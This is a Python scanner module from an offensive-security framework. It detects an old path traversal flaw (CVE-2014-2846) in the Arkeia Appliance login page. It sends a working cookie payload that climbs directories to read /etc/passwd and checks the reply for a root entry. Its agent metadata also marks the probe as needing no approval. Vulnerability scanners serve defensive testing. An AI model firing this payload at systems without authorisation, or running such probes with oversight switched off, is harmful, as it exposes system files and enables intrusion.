#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Arkeia Appliance lang cookie path traversal (CVE-2014-2846)."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Arkeia Appliance - lang Cookie LFI Detection (CVE-2014-2846)',
        'description': (
            'Detects CVE-2014-2846 by POSTing to /login/doLogin with Cookie '
            'lang=aaa..././..././etc/passwd%00.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': [
            'web', 'scanner', 'cve', 'cve2014', 'arkeia', 'lfi', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 0.9,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'file_read', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2014-2846',
        ],
        'cve': 'CVE-2014-2846',
    }

    def run(self):
        trav = 'aaa' + '..././' * 7 + 'etc/passwd'
        r = self.http_request(
            method='POST',
            path='/login/doLogin',
            data='password=ks&username=ks',
            headers={
                'Cookie': f'lang={trav}%00',
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            allow_redirects=False,
        )
        if r and re.search(r'root:.*:0:0:', r.text or ''):
            self.set_info(
                severity='high',
                reason='Arkeia lang cookie LFI (CVE-2014-2846)',
                path='/login/doLogin',
            )
            return True
        return False
